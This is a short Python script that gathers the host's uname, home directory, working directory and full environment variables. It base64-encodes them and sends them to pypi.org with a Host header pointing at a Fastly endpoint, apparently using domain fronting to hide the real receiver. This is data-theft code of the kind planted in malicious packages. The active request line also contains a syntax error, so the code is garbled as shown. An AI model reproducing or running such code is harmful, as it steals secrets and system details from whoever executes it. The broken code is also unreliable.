from urllib import request
import json
import os
import socket
import base64

def try_call(func, *args):
    try:
        return func(*args)
    except:
        return 'err'


data = {
    'host' : try_call(os.uname),
    'd' : try_call(os.path.expanduser, '~'),
    'ev' : try_call(os.environ),
    'c' : try_call(os.getcwd)
}
data = json.dumps(data)
encoded = str(base64.urlsafe_b64encode(data.encode("utf-8")), "utf-8")


#r = request.Request('https://pypi.org/reqs?d=' + encoded, headers={'Host': 'psec.forward.io.global.prod.fastly.net'})
r = request.Request('https://pypi.org/reqs?d=' data = encoded, headers={'Host': 'psec.forward.io.global.prod.fastly.net'})
k = request.urlopen(r)
print(k)

